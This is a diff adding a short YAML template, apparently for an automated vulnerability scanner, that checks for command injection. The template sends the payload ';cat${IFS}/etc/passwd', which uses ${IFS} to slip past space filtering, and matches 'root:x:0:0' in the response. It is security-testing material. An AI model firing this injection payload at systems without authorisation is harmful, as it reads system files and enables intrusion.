@@ -1,0 +1,20 @@
+id: patt-cmdi-nospace-01-exec
+name: 'PATT cmdi patt-cmdi-nospace-01 via exec'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - patt
+  - filterspace
+description: 'PATT Bypass Without Space: ${IFS} as space. [patt:patt-cmdi-nospace-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      exec:
+        - ';cat${IFS}/etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
